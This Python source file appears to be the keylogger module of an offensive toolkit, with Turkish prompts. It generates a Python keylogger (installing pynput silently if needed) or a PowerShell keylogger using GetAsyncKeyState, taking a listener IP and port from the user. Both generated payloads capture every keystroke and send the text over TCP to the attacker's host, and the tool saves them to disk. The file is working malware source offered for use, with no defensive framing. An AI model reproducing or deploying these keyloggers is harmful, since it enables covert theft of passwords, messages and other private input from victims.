import os
import time
import platform
from rich.console import Console
from rich.panel import Panel

console = Console()


def generate_keylogger_py(host, port):
    return f'''import socket
import threading
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    import subprocess
    subprocess.check_call(["pip","install","pynput"])
    from pynput.keyboard import Key, Listener

log = ""
def send_logs():
    global log
    while True:
        if log:
            try:
                s = socket.socket()
                s.connect(("{host}", {port}))
                s.send(log.encode())
                s.close()
                log = ""
            except:
                pass
        __import__("time").sleep(30)

def on_press(key):
    global log
    try:
        log += key.char
    except:
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\\n"
        elif key == Key.backspace:
            log += "[BS]"
        else:
            log += f"[{{key.name}}]"

threading.Thread(target=send_logs, daemon=True).start()
with Listener(on_press=on_press) as listener:
    listener.join()
'''


def generate_keylogger_ps(host, port):
    return f'''Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KL {{
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
}}
"@
$log = ""
while($true) {{
    for($i=8;$i -le 190;$i++) {{
        $state = [KL]::GetAsyncKeyState($i)
        if($state -eq -32767) {{
            $key = [System.Windows.Forms.Keys]$i
            $log += $key
        }}
    }}
    if($log.Length -gt 50) {{
        try {{
            $c = New-Object Net.Sockets.TCPClient("{host}",{port})
            $s = $c.GetStream()
            $b = [text.encoding]::UTF8.GetBytes($log)
            $s.Write($b,0,$b.Length)
            $c.Close()
            $log = ""
        }} catch {{}}
    }}
    Start-Sleep -Milliseconds 10
}}
'''


def run():
    console.print()
    console.print(f"  [bold purple]🌙 KEYLOGGER GENERATOR[/bold purple]")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
    console.print(f"   [#a78bfa][1][/#a78bfa] Python Keylogger")
    console.print(f"   [#a78bfa][2][/#a78bfa] PowerShell Keylogger")
    console.print(f"   [#a78bfa][0][/#a78bfa] Geri don")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

    choice = console.input("\n[bold white]  Secim: [/bold white]").strip()

    if choice == "0":
        return

    host = console.input("[bold white]  Log sunucu IP (LHOST): [/bold white]").strip()
    port = console.input("[bold white]  Log sunucu Port (LPORT): [/bold white]").strip()

    if not host or not port:
        console.print("[red]  IP ve port gerekli.[/red]")
        return

    if choice == "1":
        payload = generate_keylogger_py(host, port)
        fname = f"keylogger_{int(time.time())}.py"
    elif choice == "2":
        payload = generate_keylogger_ps(host, port)
        fname = f"keylogger_{int(time.time())}.ps1"
    else:
        console.print("[red]  Gecersiz secim.[/red]")
        return

    console.print(Panel(payload, title="🌕 Keylogger Payload", border_style="purple", padding=(1, 2)))

    save = console.input("[bold white]  Dosyaya kaydet? (e/h): [/bold white]").strip().lower()
    if save == "e":
        with open(fname, "w") as f:
            f.write(payload)
        console.print(f"[#a78bfa]  Kaydedildi: {os.path.abspath(fname)}[/#a78bfa]")
